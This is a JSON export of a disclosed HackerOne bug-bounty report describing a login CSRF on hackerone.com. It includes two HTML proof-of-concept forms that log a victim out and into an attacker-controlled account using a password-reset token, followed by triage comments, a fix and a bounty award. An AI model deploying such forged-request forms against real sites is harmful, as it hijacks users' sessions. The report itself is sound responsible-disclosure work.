{"id":727,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mjc=","url":"https://hackerone.com/reports/727","title":"Switching the user to the attacker's account","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-01-15T22:24:14.153Z","submitted_at":"2014-01-15T22:24:14.153Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dawidczagan","url":"/dawidczagan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-02-20T00:04:27.563Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2014-01-21T00:05:09.103Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Two requests are needed to make it happen.\r\n\r\nRequest1 (log out the user):\r\n\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"https://hackerone.com/users/sign_out\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"delete\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\nRequest2 (log in the user to the attacker's account):\r\n\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"https://hackerone.com/users/password\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"utf8\" value=\"â\u0026#156;\u0026#147;\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"\u0026#95;method\" value=\"put\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"user\u0026#91;reset\u0026#95;password\u0026#95;token\u0026#93;\" value=\"ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"user\u0026#91;password\u0026#93;\" value=\"ENTER_HERE_NEW_PASSWORD\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"user\u0026#91;password\u0026#95;confirmation\u0026#93;\" value=\"ENTER_HERE_NEW_PASSWORD\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"commit\" value=\"Change\u0026#32;password\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\nPlease let me know if more detailed description is needed.\r\n\r\nRegards,\r\nDawid Czagan","vulnerability_information_html":"\u003cp\u003eTwo requests are needed to make it happen.\u003c/p\u003e\n\n\u003cp\u003eRequest1 (log out the user):\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://hackerone.com/users/sign_out\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;\u0026amp;#95;method\u0026quot; value=\u0026quot;delete\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eRequest2 (log in the user to the attacker\u0026#39;s account):\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;https://hackerone.com/users/password\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;utf8\u0026quot; value=\u0026quot;â\u0026amp;#156;\u0026amp;#147;\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;\u0026amp;#95;method\u0026quot; value=\u0026quot;put\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;user\u0026amp;#91;reset\u0026amp;#95;password\u0026amp;#95;token\u0026amp;#93;\u0026quot; value=\u0026quot;ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;user\u0026amp;#91;password\u0026amp;#93;\u0026quot; value=\u0026quot;ENTER_HERE_NEW_PASSWORD\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;user\u0026amp;#91;password\u0026amp;#95;confirmation\u0026amp;#93;\u0026quot; value=\u0026quot;ENTER_HERE_NEW_PASSWORD\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;commit\u0026quot; value=\u0026quot;Change\u0026amp;#32;password\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003ePlease let me know if more detailed description is needed.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nDawid Czagan\u003c/p\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-02-20T00:04:17.072Z","allow_singular_disclosure_after":-216369491.9174233,"singular_disclosure_allowed":true,"vote_count":18,"voters":["danila","sameerphad72","mygf","eveeez","realtess","khizer47","ak1t4","whitesector","m7mdharoun","linkks","and 8 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3642,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Can you provide more detail on \"Request2\" - how are you logging the user into the attacker's account? As far as we know, this should be protected by a CSRF token. Thanks!","markdown_message":"\u003cp\u003eCan you provide more detail on \u0026quot;Request2\u0026quot; - how are you logging the user into the attacker\u0026#39;s account? As far as we know, this should be protected by a CSRF token. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T02:57:20.941Z","updated_at":"2014-01-16T02:57:20.941Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3652,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Attacker sets up an account and goes to https://hackerone.com/users/password/new to remind a password for this account. Then a link with a password reset token is sent to the attacker's e-mail. Now the attacker knows everything  to prepare the aforementioned Request2 (ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL - a password reset token from the e-mail; ENTER_HERE_NEW_PASSWORD - just enter new password for the attacker's account). \n\nRequest2 sets a new password for the attacker's account  and allows the attacker to log in the user to this account. When the user is already logged in, Request1 needs to be sent first to log out the user.\n\nPlease let me know if you need more explanation.\n\n","markdown_message":"\u003cp\u003eAttacker sets up an account and goes to \u003ca title=\"https://hackerone.com/users/password/new\" href=\"https://hackerone.com/users/password/new\"\u003ehttps://hackerone.com/users/password/new\u003c/a\u003e to remind a password for this account. Then a link with a password reset token is sent to the attacker\u0026#39;s e-mail. Now the attacker knows everything  to prepare the aforementioned Request2 (ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL - a password reset token from the e-mail; ENTER_HERE_NEW_PASSWORD - just enter new password for the attacker\u0026#39;s account). \u003c/p\u003e\n\n\u003cp\u003eRequest2 sets a new password for the attacker\u0026#39;s account  and allows the attacker to log in the user to this account. When the user is already logged in, Request1 needs to be sent first to log out the user.\u003c/p\u003e\n\n\u003cp\u003ePlease let me know if you need more explanation.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T08:14:10.792Z","updated_at":"2014-01-16T08:14:10.792Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3656,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"I'm assuming you mean that after resetting a password, you're signed in automatically and that you could potentially let someone sign in on an account under control of the attacker. \n\nThis sounds similar to an issue that was reported to us recently ([CSRF login](https://hackerone.com/reports/547)). The difference here is that the user needs to do a few manual interactions, like enter a password twice. We're lucky that our user base is tech savvy, so I don't expect someone to click a random link that explains it'll change their password without getting suspicious. \n\nClosing this out as I don't see a considerable security risk in here, because the user interaction required for this exploit to succeed is already kind of telling something's going on.\n\nThanks for reporting this anyway!","markdown_message":"\u003cp\u003eI\u0026#39;m assuming you mean that after resetting a password, you\u0026#39;re signed in automatically and that you could potentially let someone sign in on an account under control of the attacker. \u003c/p\u003e\n\n\u003cp\u003eThis sounds similar to an issue that was reported to us recently (\u003ca href=\"https://hackerone.com/reports/547\"\u003eCSRF login\u003c/a\u003e). The difference here is that the user needs to do a few manual interactions, like enter a password twice. We\u0026#39;re lucky that our user base is tech savvy, so I don\u0026#39;t expect someone to click a random link that explains it\u0026#39;ll change their password without getting suspicious. \u003c/p\u003e\n\n\u003cp\u003eClosing this out as I don\u0026#39;t see a considerable security risk in here, because the user interaction required for this exploit to succeed is already kind of telling something\u0026#39;s going on.\u003c/p\u003e\n\n\u003cp\u003eThanks for reporting this anyway!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T10:06:00.864Z","updated_at":"2014-01-16T10:06:00.864Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3664,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The user doesn't need to do anything manually - these two requests can be automatically submitted when the user clicks the link delivered by the attacker. As a result the user is automatically logged out and logged in to the attacker's account.\r\n\r\nPlease let me know if you need more explanation.\r\n\r\n","markdown_message":"\u003cp\u003eThe user doesn\u0026#39;t need to do anything manually - these two requests can be automatically submitted when the user clicks the link delivered by the attacker. As a result the user is automatically logged out and logged in to the attacker\u0026#39;s account.\u003c/p\u003e\n\n\u003cp\u003ePlease let me know if you need more explanation.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T11:22:24.839Z","updated_at":"2014-01-16T11:23:17.574Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3665,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for providing more info! I just validated your submission. We're looking into it and I'll keep you posted.","markdown_message":"\u003cp\u003eThanks for providing more info! I just validated your submission. We\u0026#39;re looking into it and I\u0026#39;ll keep you posted.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T11:33:17.645Z","updated_at":"2014-01-16T11:33:17.645Z","actor":{"username":"michiel","cleared":true,"url":"/michiel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3710,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"In the meantime I will describe one issue that probably was misunderstood at the beginning. In the POC related to logging in the user to the attacker's account (Request2) I use the following variables that need to be adjusted by the attacker:\nI. ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL \nII. ENTER_HERE_NEW_PASSWORD\n\nThese items are not entered by the user - the are entered by the attacker (or replaced by the attacker). Please notice that the attacker knows ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL, because this is a reset password token the attacker has received in the e-mail, when he decided to retrieve the password to his account (https://hackerone.com/users/password/new). ENTER_HERE_NEW_PASSWORD is just a new password that the attacker wants to have for this account. As you can see, the attacker knows everything to autosubmit Request2 and then the user becomes logged in to the attacker's account.\n\nRequest1 and Request2 are not submitted automatically, but this can be easily changed (I just prefer POCs with Submit button). However, they show that the the attacker can log out the user (Request1) and log in the user to the attacker's account (Request2). ","markdown_message":"\u003cp\u003eIn the meantime I will describe one issue that probably was misunderstood at the beginning. In the POC related to logging in the user to the attacker\u0026#39;s account (Request2) I use the following variables that need to be adjusted by the attacker:\u003cbr\u003e\nI. ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL \u003cbr\u003e\nII. ENTER_HERE_NEW_PASSWORD\u003c/p\u003e\n\n\u003cp\u003eThese items are not entered by the user - the are entered by the attacker (or replaced by the attacker). Please notice that the attacker knows ENTER_HERE_RESET_PASSWORD_TOKEN_FROM_MAIL, because this is a reset password token the attacker has received in the e-mail, when he decided to retrieve the password to his account (\u003ca title=\"https://hackerone.com/users/password/new\" href=\"https://hackerone.com/users/password/new\"\u003ehttps://hackerone.com/users/password/new\u003c/a\u003e). ENTER_HERE_NEW_PASSWORD is just a new password that the attacker wants to have for this account. As you can see, the attacker knows everything to autosubmit Request2 and then the user becomes logged in to the attacker\u0026#39;s account.\u003c/p\u003e\n\n\u003cp\u003eRequest1 and Request2 are not submitted automatically, but this can be easily changed (I just prefer POCs with Submit button). However, they show that the the attacker can log out the user (Request1) and log in the user to the attacker\u0026#39;s account (Request2). \u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-16T20:03:59.210Z","updated_at":"2014-01-16T20:03:59.210Z","actor":{"username":"dawidczagan","cleared":false,"url":"/dawidczagan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/213/b21bcd2c35e03d6e74c0f09d4fc55148249f121e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3869,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Okay! Our logged-out CSRF validation should be working properly, for reals this time. :) ","markdown_message":"\u003cp\u003eOkay! Our logged-out CSRF validation should be working properly, for reals this time. :) \u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-21T00:04:17.223Z","updated_at":"2014-01-21T00:04:17.223Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"dawidczagan","url":"/dawidczagan"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3870,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2014-01-21T00:04:28.637Z","updated_at":"2014-01-21T00:04:28.637Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"150.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"dawidczagan","url":"/dawidczagan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3871,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Would you mind publicly disclosing this report? We had a few duplicate reports and we'd like to show you were the first. Thanks again!","markdown_message":"\u003cp\u003eWould you mind publicly disclosing this report? We had a few duplicate reports and we\u0026#39;d like to show you were the first. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-01-21T00:05:09.138Z","updated_at":"2014-01-21T00:05:09.138Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8433,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-02-20T00:04:27.612Z","updated_at":"2014-02-20T00:04:27.612Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}